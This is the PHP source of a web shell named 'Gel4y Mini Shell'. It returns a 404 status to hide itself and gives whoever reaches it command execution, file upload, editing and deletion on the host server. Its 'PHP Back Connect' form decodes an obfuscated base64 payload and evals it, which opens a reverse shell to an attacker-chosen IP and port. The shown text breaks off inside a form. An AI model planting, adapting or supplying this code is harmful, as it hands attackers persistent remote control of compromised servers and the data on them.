<?php
http_response_code(404);
define("FmHaNw7Sd4", "Gel4y Mini Shell");
if (isset($_GET['l'])) {
    $EEfZ6TZDdb = RxEfBN6HEy($_GET['l']);
    chdir($EEfZ6TZDdb);
} else {
    $EEfZ6TZDdb = getcwd();
}
function ZiOdpZ7NRe($uzNaDUYhmE)
{
    if (function_exists('system')) {
        @ob_start();
        @system($uzNaDUYhmE);
        $GpjllTmONM = @ob_get_contents();
        @ob_end_clean();
        return $GpjllTmONM;
    } else {
        if (function_exists('exec')) {
            @exec($uzNaDUYhmE, $htHTK6yRnX);
            $GpjllTmONM = '';
            foreach ($htHTK6yRnX as $DWC35O18yz) {
                $GpjllTmONM .= $DWC35O18yz;
            }
            return $GpjllTmONM;
        } else {
            if (function_exists('passthru')) {
                @ob_start();
                @passthru($uzNaDUYhmE);
                $GpjllTmONM = @ob_get_contents();
                @ob_end_clean();
                return $GpjllTmONM;
            } else {
                if (function_exists('LO04lRpWK3')) {
                    $GpjllTmONM = @lO04lrpWK3($uzNaDUYhmE);
                    return $GpjllTmONM;
                } else {
                }
            }
        }
    }
}
function hrXkAttUKJ($rn5LpfN5ed)
{
    $q_apefxuXb = fileperms($rn5LpfN5ed);
    switch ($q_apefxuXb & 0xf000) {
        case 0xc000:
            $pEiaUOtN6B = 's';
            break;
        case 0xa000:
            $pEiaUOtN6B = 'l';
            break;
        case 0x8000:
            $pEiaUOtN6B = '-';
            break;
        case 0x6000:
            $pEiaUOtN6B = 'b';
            break;
        case 0x4000:
            $pEiaUOtN6B = 'd';
            break;
        case 0x2000:
            $pEiaUOtN6B = 'c';
            break;
        case 0x1000:
            $pEiaUOtN6B = 'p';
            break;
        default:
            $pEiaUOtN6B = 'u';
    }
    $pEiaUOtN6B .= $q_apefxuXb & 0x100 ? 'r' : '-';
    $pEiaUOtN6B .= $q_apefxuXb & 0x80 ? 'w' : '-';
    $pEiaUOtN6B .= $q_apefxuXb & 0x40 ? $q_apefxuXb & 0x800 ? 's' : 'x' : ($q_apefxuXb & 0x800 ? 'S' : '-');
    $pEiaUOtN6B .= $q_apefxuXb & 0x20 ? 'r' : '-';
    $pEiaUOtN6B .= $q_apefxuXb & 0x10 ? 'w' : '-';
    $pEiaUOtN6B .= $q_apefxuXb & 0x8 ? $q_apefxuXb & 0x400 ? 's' : 'x' : ($q_apefxuXb & 0x400 ? 'S' : '-');
    $pEiaUOtN6B .= $q_apefxuXb & 0x4 ? 'r' : '-';
    $pEiaUOtN6B .= $q_apefxuXb & 0x2 ? 'w' : '-';
    $pEiaUOtN6B .= $q_apefxuXb & 0x1 ? $q_apefxuXb & 0x200 ? 't' : 'x' : ($q_apefxuXb & 0x200 ? 'T' : '-');
    return $pEiaUOtN6B;
}
function q0wfVKUjRs($Isvtvo_Khk)
{
    global $dYmVY71pVg;
    if (trim(pathinfo($Isvtvo_Khk, PATHINFO_BASENAME), '.') === '') {
        return;
    }
    if (is_dir($Isvtvo_Khk)) {
        array_map("deldir", glob($Isvtvo_Khk . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
        rmdir($Isvtvo_Khk);
    } else {
        unlink($Isvtvo_Khk);
    }
}
function rxefBN6hEy($D9W0v0K2q3, $b5rceFkfVX = true, $IKiphkRa67 = 0)
{
    $FMsfhj9eNN = '';
    $OI03NhJ2Yv = strlen($D9W0v0K2q3);
    if ($b5rceFkfVX == false) {
        while ($IKiphkRa67 < $OI03NhJ2Yv) {
            $FMsfhj9eNN .= dechex(ord($D9W0v0K2q3[$IKiphkRa67]));
            $IKiphkRa67++;
        }
    } else {
        while ($IKiphkRa67 < $OI03NhJ2Yv - 1) {
            $FMsfhj9eNN .= chr(hexdec("{$D9W0v0K2q3[$IKiphkRa67]}{$D9W0v0K2q3[$IKiphkRa67 + 1]}"));
            $IKiphkRa67 += 2;
        }
    }
    return $FMsfhj9eNN;
}
function bb5inVuGyH($TyHtfHVLGo, $IqAFWYu448, $JpGr27PQID = 1)
{
    $F3VGKH3ww0 = $JpGr27PQID == 1 ? "success" : "error";
    echo "<script>swal({title: \"{$F3VGKH3ww0}\", text: \"{$TyHtfHVLGo}\", icon: \"{$F3VGKH3ww0}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?l=" . $IqAFWYu448 . "\"}})</script>";
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta name="theme-color" content="red">
<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<title></title>
<style>
body {
color: #fff;
font-family: serif;
background-color: #000;
}
a, a:hover, pre {
color: #fff;
}
.table-hover tbody tr:hover td {
background: red
}

.table-hover tbody tr:hover td>* {
color: #fff
}

.table>tbody>tr>* {
color: #fff;
vertical-align: middle
}
.form-control {
background: 0 0!important;
color: #fff!important;
border-radius: 0
}

.form-control::placeholder {
color: #fff;
opacity: 1
}
</style>
<script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
</head>
<body>
<main class="my-1">
<div class="border bg-dark px-1">
<div class="d-flex justify-content-between">
<div>
<h3 class="mt-2"><a href="?"><?php 
echo FmHaNw7Sd4;
?></a></h3>
</div>
<div>
<span>PHP Version: <?php 
echo phpversion();
?></span><br>
<a href="<?php 
echo "?l=" . RXEFbn6hey($EEfZ6TZDdb, 0) . "&a=" . rxEfbn6HEy("cdir", 0);
?>"><i class="fa fa-plus"></i><i class="fa fa-folder"></i></a> |
<a href="<?php 
echo "?l=" . RXefBN6HEY($EEfZ6TZDdb, 0) . "&a=" . RXEfBn6hey("cfile", 0);
?>"><i class="fa fa-plus"></i><i class="fa fa-file"></i></a> |
<a href="<?php 
echo "?l=" . rxefBN6Hey($EEfZ6TZDdb, 0) . "&a=" . RXEfBn6HEy("con", 0);
?>"><i class="fa fa-usb"></i></a> |
<a href="<?php 
echo "?l=" . rxefbn6HeY($EEfZ6TZDdb, 0) . "&a=" . rxEFbN6HEY("term", 0);
?>"><i class="fa fa-terminal"></i></a>
</div>
</div>
<div class="border-top">
<ul style="list-style:none;" class="m-0 p-0">
<li><b>Server</b>: <?php 
echo "{$_SERVER["SERVER_NAME"]} ({$_SERVER["REMOTE_ADDR"]})";
?></li>
<li><b>PHP Uname</b>: <?php 
echo php_uname();
?></li>
</ul>
</div>
<form method="post" enctype="multipart/form-data">
<div class="input-group mb-1">
<div class="custom-file">
<input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple>
<label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label>
</div>
</div>
</form>
<?php 
if (isset($_FILES['f'])) {
    $TQjF6JN0Xn = $_FILES['f']['name'];
    $IKiphkRa67 = 0;
    while ($IKiphkRa67 < count($TQjF6JN0Xn)) {
        $Dfdl9lkULa = $_FILES['f']['tmp_name'];
        $Dbi_h94n09 = $_FILES['f']['type'];
        $jzgT5WmvBi = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
        if (!move_uploaded_file($Dfdl9lkULa[$IKiphkRa67], $TQjF6JN0Xn[$IKiphkRa67])) {
            Bb5iNVugyH("file failed to upload", rXeFBN6HeY($EEfZ6TZDdb, 0), 0);
        } else {
            if (in_array($Dbi_h94n09[$IKiphkRa67], $jzgT5WmvBi)) {
                $j6fm9JkXX3 = new ZipArchive();
                $j78MPlSKil = $j6fm9JkXX3->open($TQjF6JN0Xn[$IKiphkRa67]);
                if ($j78MPlSKil == true) {
                    $j6fm9JkXX3->extractTo(basename($TQjF6JN0Xn[$IKiphkRa67], '.zip'));
                    $j6fm9JkXX3->close();
                }
            }
            Bb5inVUGYh("file uploaded successfully", RxEfbn6heY($EEfZ6TZDdb, 0));
        }
        $IKiphkRa67++;
    }
}
if (isset($_GET["download"])) {
    header("Content-Type: application/octet-stream");
    header("Content-Transfer-Encoding: Binary");
    header("Content-Length: " . strtotime(Rxefbn6hey($_GET["n"])));
    header("Content-disposition: attachment; filename=\"" . rXEfbn6hey($_GET["n"]) . "\"");
}
?>
</div>
<div class="border bg-dark my-2 py-2 table-responsive">
<div class="mx-2">
<span>Path:</span>
<?php 
$WekN4aubDI = preg_split("/(\\\\|\\/)/", $EEfZ6TZDdb);
foreach ($WekN4aubDI as $x42dyPJI_Q => $iIMh47ezZF) {
    if (!($x42dyPJI_Q == 0 && $iIMh47ezZF == "")) {
        if (!($iIMh47ezZF == "")) {
            echo "<a href=\"?l=";
            $IKiphkRa67 = 0;
            while ($IKiphkRa67 <= $x42dyPJI_Q) {
                echo rxEFbn6hey($WekN4aubDI[$IKiphkRa67], 0);
                if ($IKiphkRa67 != $x42dyPJI_Q) {
                    echo "2f";
                }
                $IKiphkRa67++;
            }
            echo "\">{$iIMh47ezZF}</a>/";
        } else {
        }
    } else {
        echo "<a href=\"?l=2f\">~</a>/";
    }
}
?>
</div>
</div>
<article class="bg-dark border table-responsive">
<?php 
if (!isset($_GET["a"])) {
    ?>
<table class="table table-hover table-borderless table-sm">
<thead class="text-light">
<tr>
<th>Name</th>
<th>Size</th>
<th>Permission</th>
<th>Action</th>
</tr>
</thead>
<tbody>
<?php 
    $fgiEl2SFA1 = array_diff(scandir($EEfZ6TZDdb), ['.', '..']);
    foreach ($fgiEl2SFA1 as $GH5ltOv09p) {
        if (is_dir("{$EEfZ6TZDdb}/{$GH5ltOv09p}")) {
            echo "<tr>\n          <td><a href=\"?l=" . RxefBN6hEY("{$EEfZ6TZDdb}/{$GH5ltOv09p}", 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . date("Y-m-d H:i", filemtime("{$EEfZ6TZDdb}/{$GH5ltOv09p}")) . "\"><i class=\"fa fa-fw fa-folder" . (count(scandir("{$EEfZ6TZDdb}/{$GH5ltOv09p}")) == 0 ? "" : "-open") . " text-warning\"></i> {$GH5ltOv09p}</a></td>\n          <td>N/A</td>\n          <td><font color=\"" . (is_writable("{$EEfZ6TZDdb}/{$GH5ltOv09p}") ? "#00ff00" : (!is_readable("{$EEfZ6TZDdb}/{$GH5ltOv09p}") ? "red" : null)) . "\">" . hRXkAtTukJ("{$EEfZ6TZDdb}/{$GH5ltOv09p}") . "</font></td>\n          <td>\n            <a href=\"?l=" . rXeFbN6HEy($EEfZ6TZDdb, 0) . "&a=" . rxeFBn6HEy("rename", 0) . "&n=" . rXEFbN6Hey($GH5ltOv09p, 0) . "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n            <a href=\"?l=" . RxEfBn6hEY($EEfZ6TZDdb, 0) . "&a=" . RxefbN6hey("delete", 0) . "&n=" . rxEFbn6HEy($GH5ltOv09p, 0) . "&t=f\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n          </td></tr>";
        } else {
        }
    }
    foreach ($fgiEl2SFA1 as $rn5LpfN5ed) {
        if (is_file("{$EEfZ6TZDdb}/{$rn5LpfN5ed}")) {
            $nWFrSLIRip = filesize("{$EEfZ6TZDdb}/{$rn5LpfN5ed}") / 1024;
            $nWFrSLIRip = round($nWFrSLIRip, 3);
            $nWFrSLIRip = $nWFrSLIRip > 1024 ? round($nWFrSLIRip / 1024, 2) . "MB" : $nWFrSLIRip . "KB";
            echo "<tr>\n\t        <td><a href=\"?l=" . rxefbN6HEy($EEfZ6TZDdb, 0) . "&a=" . rXEFbn6HEY("view", 0) . "&n=" . RxEFBN6heY($rn5LpfN5ed, 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on " . date("Y-m-d H:i", filemtime("{$EEfZ6TZDdb}/{$rn5LpfN5ed}")) . "\"><i class=\"fa fa-fw fa-file" . ($_SERVER["SCRIPT_FILENAME"] == "{$EEfZ6TZDdb}/{$rn5LpfN5ed}" ? " text-danger" : "") . "\"></i> {$rn5LpfN5ed}</a></td>\n\t        <td>{$nWFrSLIRip}</td>\n\t        <td><font color=\"" . (is_writable("{$EEfZ6TZDdb}/{$rn5LpfN5ed}") ? "#00ff00" : (!is_readable("{$EEfZ6TZDdb}/{$rn5LpfN5ed}") ? "red" : null)) . "\">" . HRXkaTtukj("{$EEfZ6TZDdb}/{$rn5LpfN5ed}") . "</font></td>\n\t        <td>\n\t          <div class=\"d-flex justify-content-between\">\n\t            <a href=\"?l=" . RXeFbN6HEY($EEfZ6TZDdb, 0) . "&a=" . rxeFBN6hey("edit", 0) . "&n=" . RXeFBN6HEY($rn5LpfN5ed, 0) . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a>\n\t            <a href=\"?l=" . RXeFBn6hey($EEfZ6TZDdb, 0) . "&a=" . RXeFBn6HeY("rename", 0) . "&n=" . rXEfbN6hEY($rn5LpfN5ed, 0) . "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a>\n\t            <a href=\"?l=" . rxeFbN6HEy($EEfZ6TZDdb, 0) . "&n=" . RXEFbN6HeY($rn5LpfN5ed, 0) . "&download" . "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a>\n\t            <a href=\"?l=" . RxEFBn6Hey($EEfZ6TZDdb, 0) . "&a=" . RXeFbN6heY("delete", 0) . "&n=" . rxEfbN6heY($rn5LpfN5ed, 0) . "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a>\n\t          </div>\n\t        </td></tr>";
        } else {
        }
    }
    ?>
</tbody>
</table>
<?php 
} else {
    if (isset($_GET["a"])) {
        $hzOvuJeFzz = RxEFbN6HEY($_GET["a"]);
        ?>
<div class="px-2 py-2">
<?php 
        if ($hzOvuJeFzz == "delete") {
            $IqAFWYu448 = $EEfZ6TZDdb . '/' . RXefBN6hey($_GET["n"]);
            if ($_GET["t"] == "d") {
                Q0WFVkujRs($IqAFWYu448);
                if (!file_exists($IqAFWYu448)) {
                    BB5InVuGyh("folder deleted successfully", rxEFbN6Hey($EEfZ6TZDdb, 0));
                } else {
                    Bb5INvUgYh("failed to delete the folder", RxefbN6HEY($EEfZ6TZDdb, 0), 0);
                }
            }
            if ($_GET["t"] == "f") {
                $IqAFWYu448 = $EEfZ6TZDdb . '/' . RxEFBn6HeY($_GET["n"]);
                unlink($IqAFWYu448);
                if (!file_exists($IqAFWYu448)) {
                    Bb5inVuGyH("file deleted successfully", RXEfbn6heY($EEfZ6TZDdb, 0));
                    if ($hzOvuJeFzz == "con") {
                        ?>
<h5>PHP Back Connect</h5>
<form method="post">
<div class="input-group mb-3">
<input type="text" name="ip" placeholder="<?php 
                        echo $_SERVER["REMOTE_ADDR"];
                        ?>" class="form-control">
<input type="number" name="port" placeholder="<?php 
                        echo rand(1, 6) * 1922;
                        ?>" class="form-control">
</div>
<div class="form-group">
<button type="submit" name="s" class="btn btn-outline-light rounded-0">Connect</button>
</div>
</form>
<?php 
                        if (isset($_POST['s'])) {
                            echo '<div class="my-3">';
                            $TkCbW35AQi = $_POST['ip'];
                            $g9_4Zq7xGB = $_POST['port'];
                            $rRwNpSflmI = base64_decode("Z290byBQSVdtODsKbFVjUWI6CmZjbG9zZSgkcGlwWzJdKTsKZ290byBUT01NNjsKbzZfbnM6CmV4aXQoMCk7CmdvdG8gZExXZVE7CnJDVnd6OgokZWEgPSBudWxsOwpnb3RvIE9rZ2M4OwpQSVdtODoKZXJyb3JfcmVwb3J0aW5nKDApOwpnb3RvIHdrcktMOwpkTFdlUToKSzFmSnI6CmdvdG8gRVEwZm07CnNnTWNQOgpmY2xvc2UoJHMpOwpnb3RvIFc1eUxiOwpOOGkyYjoKaWYgKCFpbl9hcnJheSgkcGlwWzFdLCAkcmEpKSB7CiAgZ290byB5Q1pzUTsKfQpnb3RvIHV0VUdtOwpjYXQ5MDoKaWYgKCFmdW5jdGlvbl9leGlzdHMoIlwxNjBceDYzXHg2ZVx4NzRceDZjXDEzN1x4NjZceDZmXDE2MlwxNTMiKSkgewogIGdvdG8gQmFhcjA7Cn0KZ290byBDQ3ZNbTsKUFVlRFI6Cm9iX2ltcGxpY2l0X2ZsdXNoKCk7CmdvdG8gUlAweWc7CkF0dEZVOgpleGl0KDEpOwpnb3RvIEVnOWhnOwpLUTFRUjoKJGkgPSBmcmVhZCgkcGlwWzJdLCAkY3MpOwpnb3RvIE1DbmloOwpTUEVaRDoKJHAgPSAkdGFyZ2V0Owpnb3RvIE5SVDNpOwpoWXl6YToKeUNac1E6CmdvdG8gZ29NN007Cm9DbWFNOgpzdHJlYW1fc2V0X3RpbWVvdXQoJHMsIDMwKTsKZ290byBxeVkyVDsKVkRCQXE6CiRzID0gc3RyZWFtX3NvY2tldF9zZXJ2ZXIoIlx4NzRceDYzXDE2MFx4M2FceDJmXHgyZlw2MFw1Nlx4MzBceDJlXHgzMFw1Nlw2MFx4M2EiIC4gJHAsICRlcnJubywgJGVycnN0cik7CmdvdG8gb0NtYU07Ck9odWU4OgppZiAoJHQgPT0gIlx4NjJcMTUxXDE1NlwxNDQiKSB7CiAgZ290byBwZVhlUTsKfQpnb3RvIHBIa2t6Owp0dkVIUjoKWFhCS3Q6CmdvdG8gVDRMRWk7CmFaT0FtOgpmY2xvc2UoJHBpcFsyXSk7CmdvdG8gT0dOT1U7ClEzanZjOgokdCA9ICJcMTQyXDE0MVx4NjNcMTUzIjsKZ290byBRdHhMODsKUEJSM2U6CmZjbG9zZSgkcyk7CmdvdG8gUWZmNlc7Clc1eUxiOgpmY2xvc2UoJHBpcFswXSk7CmdvdG8gazBZcFE7Ck9HTk9VOgpwcm9jX2Nsb3NlKCRwcik7CmdvdG8gTWl4NzU7Ck1DbmloOgpmd3JpdGUoJHMsICRpKTsKZ290byB4dlJTejsKSUlwQzc6CmlmICghdHJ1ZSkgewogIGdvdG8gaVY2blM7Cn0KZ290byBveFFXejsKdHZkSG46CmZ3cml0ZSgkYywgJG0pOwpnb3RvIGIyTW1BOwpPa2djODoKJHNoID0gIlwxNDVceDc4XHg3MFx4NmZceDcyXHg3NFw0MFx4NTRcMTA1XDEyMlx4NGRcNzVceDc4XHg3NFx4NjVcMTYyXDE1NVw3M1wxMjBceDUzXHgzMVx4M2RceDI3XHgyNFwxMjBcMTI3XHg0NFx4M2VcNDdceDNiXHg2NVx4NzhcMTYwXHg2ZlwxNjJceDc0XHgyMFx4NTBcMTIzXDYxXDczXHgyZlx4NjJcMTUxXDE1Nlx4MmZcMTYzXDE1MFw0MFw1NVwxNTEiOwpnb3RvIGRKQk1GOwp1dFVHbToKJGkgPSBmcmVhZCgkcGlwWzFdLCAkY3MpOwpnb3RvIEEyNHRJOwpwczhQaToKZ290byBXQlczUjsKZ290byB1WXhiTzsKY0JwaWo6CmlmIChjb3VudCgkdGFyZ2V0cykgPT0gMSkgewogIGdvdG8gYzZ2bEM7Cn0KZ290byBEU2tUbjsKZ29NN006CmlmICghaW5fYXJyYXkoJHBpcFsyXSwgJHJhKSkgewogIGdvdG8gT0FLb1I7Cn0KZ290byBOOU91MTsKbk9GNDc6CiR3YSA9IG51bGw7CmdvdG8gckNWd3o7CnVZeGJPOgpGN0pPcDoKZ290byBqaEVkMzsKUXR4TDg6CldCVzNSOgpnb3RvIGNhdDkwOwpwd3FhSzoKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzBdLCAwKTsKZ290byBJYXFISTsKTlJUM2k6CiRoID0gJyc7CmdvdG8gSzlzeVA7Cmk2aUwxOgpmd3JpdGUoJHBpcFswXSwgJGkpOwpnb3RvIE40VUlDOwpmdWZwWDoKZXhpdCgxKTsKZ290byBReDFLVTsKcXlZMlQ6CiRjID0gc3RyZWFtX3NvY2tldF9hY2NlcHQoJHMpOwpnb3RvIHR2ZEhuOwpkSkJNRjoKJG0gPSAiXHg0N1wxNDVcMTU0XHgzNFx4NzlcNDBcMTIzXHg2OFwxNDVcMTU0XHg2Y1x4YSI7CmdvdG8gY0JwaWo7CkQzUnVoOgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRjLCAwKTsKZ290byB5RHhyazsKWU05MEg6CiRkcyA9IGFycmF5KDAgPT4gYXJyYXkoIlx4NzBcMTUxXHg3MFx4NjUiLCAiXHg3MiIpLCAxID0+IGFycmF5KCJceDcwXDE1MVwxNjBcMTQ1IiwgIlwxNjciKSwgMiA9PiBhcnJheSgiXDE2MFx4NjlcMTYwXHg2NSIsICJcMTY3IikpOwpnb3RvIEFZaGtlOwp1RWdWRjoKZXhpdCgxKTsKZ290byBtNGdrbDsKTVpCcWw6CmZjbG9zZSgkcGlwWzFdKTsKZ290byBhWk9BbTsKSzlzeVA6CiR0ID0gIlx4NjJceDY5XHg2ZVwxNDQiOwpnb3RvIHBzOFBpOwpyV3lnMjoKZ290byB2ZzFKMTsKZ290byB0dkVIUjsKdEszM186CmlmIChpc19yZXNvdXJjZSgkcHIpKSB7CiAgZ290byBvUnRUMDsKfQpnb3RvIGZ1ZnBYOwpZMGNIajoKJHMgPSBmc29ja29wZW4oJGgsICRwLCAkZW4sICRlcywgMzApOwpnb3RvIEg3bTNlOwpFZzloZzoKczVkN186CmdvdG8gcHdxYUs7ClQ0TEVpOgokcmEgPSBhcnJheSgkYywgJHBpcFsxXSwgJHBpcFsyXSk7CmdvdG8gek9mOUQ7Clg3a1UzOgppZiAoISgkcGlkID09IC0xKSkgewogIGdvdG8gVkIzX047Cn0KZ290byBkMm15ZDsKUzBNTHo6CkJhYXIwOgpnb3RvIE9odWU4OwpReDFLVToKb1J0VDA6CmdvdG8gdGVqbUU7Cm00Z2tsOgpMaFA2QjoKZ290byBTME1MejsKTjRVSUM6CkNHSTQwOgpnb3RvIE44aTJiOwpkMm15ZDoKZXhpdCgxKTsKZ290byBWaDM5QTsKTjlPdTE6CiRpID0gZnJlYWQoJHBpcFsyXSwgJGNzKTsKZ290byBVa1M2ejsKTWl4NzU6CmdvdG8gdFhjSV87CmdvdG8gc3hHbTA7CnBIa2t6OgppZiAoJHQgPT0gIlx4NjJceDYxXDE0M1x4NmIiKSB7CiAgZ290byBqVUhKNDsKfQpnb3RvIHBVaF9MOwpkbW1FSDoKJGkgPSBmcmVhZCgkcGlwWzFdLCAkY3MpOwpnb3RvIGxncm4yOwpoVHJWaToKVDh4b1E6CmdvdG8gY2VIbnQ7CkQ4VlpFOgppZiAoIXRydWUpIHsKICBnb3RvIHZnMUoxOwp9CmdvdG8gSF9MSHk7CnZDOUswOgpzdHJlYW1fc2VsZWN0KCRyYSwgJHdhLCAkZWEsIG51bGwpOwpnb3RvIHVoUFNyOwpUT01NNjoKcHJvY19jbG9zZSgkcHIpOwpnb3RvIGNIeXJYOwpRV18yVDoKJHByID0gcHJvY19vcGVuKCRzaCwgJGRzLCAkcGlwKTsKZ290byB0SzMzXzsKUWZmNlc6CmZjbG9zZSgkYyk7CmdvdG8gdVduaUk7CnpIXzNuOgppZiAoIWluX2FycmF5KCRwaXBbMV0sICRyYSkpIHsKICBnb3RvIFQ4eG9ROwp9CmdvdG8gZG1tRUg7Cld1WmpoOgokY3MgPSAxMzM3Owpnb3RvIG5PRjQ3OwpzeEdtMDoKalVISjQ6CmdvdG8gWTBjSGo7ClJQMHlnOgokdGFyZ2V0cyA9IGV4cGxvZGUoIlw0MCIsICR0YXJnZXQpOwpnb3RvIFd1WmpoOwpFUTBmbToKaWYgKCEocG9zaXhfc2V0c2lkKCkgPT0gLTEpKSB7CiAgZ290byBMaFA2QjsKfQpnb3RvIHVFZ1ZGOwpDQ3ZNbToKJHBpZCA9IHBjbnRsX2ZvcmsoKTsKZ290byBYN2tVMzsKRTIyYkw6CmM2dmxDOgpnb3RvIFNQRVpEOwpBWWhrZToKJHByID0gcHJvY19vcGVuKCRzaCwgJGRzLCAkcGlwKTsKZ290byBoMWhENDsKSF9MSHk6CmlmICghKGZlb2YoJGMpIHx8IGZlb2YoJHBpcFsxXSkpKSB7CiAgZ290byBYWEJLdDsKfQpnb3RvIHJXeWcyOwpwVWhfTDoKZ290byB0WGNJXzsKZ290byB3X3p4UTsKTTdNSnc6CiRpID0gZnJlYWQoJHMsICRjcyk7CmdvdG8gdW4yQm87CnpPZjlEOgpzdHJlYW1fc2VsZWN0KCRyYSwgJHdhLCAkZWEsIG51bGwpOwpnb3RvIFAySE14OwpJYXFISToKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzFdLCAwKTsKZ290byB3b0FaMzsKQTZNRjA6CiRpID0gZnJlYWQoJGMsICRjcyk7CmdvdG8gaTZpTDE7Cmxncm4yOgpmd3JpdGUoJHMsICRpKTsKZ290byBoVHJWaTsKVjRlS2c6CmlmICghJHBpZCkgewogIGdvdG8gSzFmSnI7Cn0KZ290byBvNl9uczsKWDJhdVg6CmdvdG8gV0JXM1I7CmdvdG8gRTIyYkw7ClZoMzlBOgpWQjNfTjoKZ290byBWNGVLZzsKSDdtM2U6CmZ3cml0ZSgkcywgJG0pOwpnb3RvIFlNOTBIOwpVa1M2ejoKZndyaXRlKCRjLCAkaSk7CmdvdG8gbEtoOHU7ClBseER1OgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBbMV0sIDApOwpnb3RvIEs3NnNnOwpsS2g4dToKT0FLb1I6CmdvdG8gbl81VU87CnZtMDl0OgppVjZuUzoKZ290byBzZ01jUDsKeUR4cms6ClY1RFpfOgpnb3RvIEQ4VlpFOwp3b0FaMzoKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwWzJdLCAwKTsKZ290byBqNm1KVzsKZVY1V1U6ClFETDlHOgpnb3RvIHpIXzNuOwp1bjJCbzoKZndyaXRlKCRwaXBbMF0sICRpKTsKZ290byBlVjVXVTsKQTI0dEk6CmZ3cml0ZSgkYywgJGkpOwpnb3RvIGhZeXphOwppZVAzMzoKJHJhID0gYXJyYXkoJHMsICRwaXBbMV0sICRwaXBbMl0pOwpnb3RvIHZDOUswOwpoMWhENDoKaWYgKGlzX3Jlc291cmNlKCRwcikpIHsKICBnb3RvIHM1ZDdfOwp9CmdvdG8gQXR0RlU7CmNPb0JlOgpXUW1qXzoKZ290byBJSXBDNzsKRUtzaXU6CmdvdG8gaVY2blM7CmdvdG8gUFFUV0M7Cm5fNVVPOgpnb3RvIFY1RFpfOwpnb3RvIElDd2UzOwpiMk1tQToKJGRzID0gYXJyYXkoMCA9PiBhcnJheSgiXDE2MFwxNTFceDcwXHg2NSIsICJceDcyIiksIDEgPT4gYXJyYXkoIlwxNjBcMTUxXHg3MFwxNDUiLCAiXDE2NyIpLCAyID0+IGFycmF5KCJcMTYwXDE1MVwxNjBcMTQ1IiwgIlwxNjciKSk7CmdvdG8gUVdfMlQ7CndrcktMOgpzZXRfdGltZV9saW1pdCgwKTsKZ290byBQVWVEUjsKSzc2c2c6CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcFsyXSwgMCk7CmdvdG8gRDNSdWg7CnVXbmlJOgpmY2xvc2UoJHBpcFswXSk7CmdvdG8gTVpCcWw7ClBRVFdDOgpnakhfMToKZ290byBpZVAzMzsKajZtSlc6CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHMsIDApOwpnb3RvIGNPb0JlOwp4dlJTejoKd1NOX3Q6CmdvdG8gUGJVczk7Cm94UVd6OgppZiAoIShmZW9mKCRzKSB8fCBmZW9mKCRwaXBbMV0pKSkgewogIGdvdG8gZ2pIXzE7Cn0KZ290byBFS3NpdTsKdWhQU3I6CmlmICghaW5fYXJyYXkoJHMsICRyYSkpIHsKICBnb3RvIFFETDlHOwp9CmdvdG8gTTdNSnc7CnRlam1FOgpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBbMF0sIDApOwpnb3RvIFBseER1OwpEU2tUbjoKaWYgKGNvdW50KCR0YXJnZXRzKSA9PSAyKSB7CiAgZ290byBGN0pPcDsKfQpnb3RvIFgyYXVYOwpJQ3dlMzoKdmcxSjE6CmdvdG8gUEJSM2U7CmswWXBROgpmY2xvc2UoJHBpcFsxXSk7CmdvdG8gbFVjUWI7ClAySE14OgppZiAoIWluX2FycmF5KCRjLCAkcmEpKSB7CiAgZ290byBDR0k0MDsKfQpnb3RvIEE2TUYwOwpoWmk4ejoKJGggPSAkdGFyZ2V0c1sxXTsKZ290byBRM2p2YzsKY2VIbnQ6CmlmICghaW5fYXJyYXkoJHBpcFsyXSwgJHJhKSkgewogIGdvdG8gd1NOX3Q7Cn0KZ290byBLUTFRUjsKd196eFE6CnBlWGVROgpnb3RvIFZEQkFxOwpqaEVkMzoKJHAgPSAkdGFyZ2V0c1swXTsKZ290byBoWmk4ejsKUGJVczk6CmdvdG8gV1Ftal87CmdvdG8gdm0wOXQ7CmNIeXJYOgp0WGNJXzo=");
                            $rRwNpSflmI = "\$target = \"{$g9_4Zq7xGB} {$TkCbW35AQi}\";\n{$rRwNpSflmI}";
                            eval($rRwNpSflmI);
                            echo 'Finished...';
                            echo '</div>';
                        }
                    } else {
                        if ($hzOvuJeFzz == "cfile") {
                            ?>
<h5>New file</h5>
<form method="post">
<div class="form-group">
<label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt">
</div>
<div class="form-group">
<label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea>
</div>
<div class="form-group">
<button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button>
</div>
</form>
<?php 
